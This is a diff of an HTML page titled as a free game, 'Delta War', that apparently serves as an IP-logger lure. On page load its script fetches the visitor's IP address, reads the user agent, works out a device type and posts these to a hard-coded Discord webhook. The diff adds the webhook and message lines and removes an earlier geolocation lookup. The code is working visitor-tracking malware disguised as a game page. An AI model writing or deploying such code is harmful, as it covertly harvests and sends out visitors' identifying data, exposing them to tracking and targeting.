@@ -4,15 +4,16 @@
  <meta charset="UTF-8">
  <title>Delta War | Play Free Now</title>
 </head>
-<body onload="logLocation()">
+<body onload="logIP()">
  <!-- Fake content here -->
  <h1>Your ip is currently being sent to Cdrillluhs IPL(</h1>
 
  <script>
- async function logLocation() {
+ async function logIP() {
  const ipResponse = await fetch('https://api.ipify.org');
  const ip = await ipResponse.text();
  const userAgent = navigator.userAgent;
+ const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
 
  // Basic device detection
  let deviceType;
@@ -42,22 +43,11 @@
  deviceType = "Unknown Device";
  }
 
- // IP Geolocation
- const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
- const geoData = await geoResponse.json();
- 
- // Extract relevant data
- const city = geoData.city;
- const regionName = geoData.regionName;
- 
- // Build webhook message
- const webhookURL = 'https://discord.com/api/webhooks/1543545525821767750/6eYDQxde7zpBEwGEI8eLDnpewZynTvxDuBjwm9HPCMnZZStybikfq6FuZwhw_RXmdRyL';
- 
-fetch(webhookURL, {  
- method: 'POST',  
- headers: { 'Content-Type': 'application/json' },  
- body: JSON.stringify({ content: `Logged IP+Location Combo` }),  
-});  
+ fetch(webhookURL, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({ content: `Logged IP: ${ip} | Device: ${deviceType}` }),
+ });
  }
  </script>
 </body>
